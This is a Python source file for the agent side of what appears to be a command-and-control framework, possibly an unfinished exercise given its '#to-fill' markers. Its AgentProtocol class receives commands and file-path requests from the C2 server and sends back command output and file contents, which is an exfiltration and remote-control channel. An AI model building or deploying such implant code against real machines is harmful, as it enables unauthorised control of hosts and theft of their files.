from protocol.common import *


class AgentProtocol:
    def __init__(self, client_socket):
        self.client_socket = client_socket

    def agent_hello_receive(self):
        return handle_init_handshake_receive(self.client_socket)

    def agent_hello_send(self, agent_uuid):
        return handle_init_handshake_send(self.client_socket, agent_uuid, MESSAGE_REQUEST)

    # todo: #to-fill

    def receive_file_upload_request_from_c2(self, file_path_size):
        if file_path_size == 0:
            raise ValueError(f"[-] File path sent from C2 is empty")

        file_path = self.client_socket.recv(file_path_size)
        if not file_path:
            raise ValueError(f"[-] File path sent from C2 is empty")

        return file_path

    def receive_command_from_c2(self):
        command_id = receive_command_id(self.client_socket)
        print(f"[+] Received command {command_id} from C2")
        if command_id == FILE_UPLOAD_COMMAND_ID:
            message_type, status, file_path_size, file_data_size = struct.unpack(FILE_UPLOAD_PACKET_FORMAT, self.client_socket.recv(10))
        else:
            message_type, status, payload_size = struct.unpack(COMMAND_PAYLOAD_PACKET_FORMAT, self.client_socket.recv(6))

        if message_type != MESSAGE_REQUEST:
            raise TypeError(f"[-] C2 sent {message_type} message")

        if command_id == FILE_UPLOAD_COMMAND_ID:
            return command_id, self.receive_file_upload_request_from_c2(file_path_size)

        return command_id, receive_payload(self.client_socket, payload_size)

    def send_file_upload_response(self, command_id, command_status, file_data, file_path):
        print(f"[+] Sending file upload response. File data size: {len(file_data)}. File path size: {len(file_path)}")
        self.client_socket.sendall(
            (pack_command_id(command_id) +
             struct.pack(FILE_UPLOAD_PACKET_FORMAT, MESSAGE_RESPONSE, command_status, len(file_path), len(file_data)) +
             file_path +
             file_data)
        )

    def send_command_response(self, command_id, command_status, command_response):
        if not isinstance(command_response, bytes):
            command_response = command_response.encode()  # make sure return type for socket is bytes

        print(f"[+] Sending response for command {command_id}. Total response size: {len(command_response)}")
        self.client_socket.sendall(
            (pack_command_id(command_id) +
             struct.pack(COMMAND_PAYLOAD_PACKET_FORMAT, MESSAGE_RESPONSE, command_status, len(command_response)) +
             command_response)
        )
    # todo: #to-fill




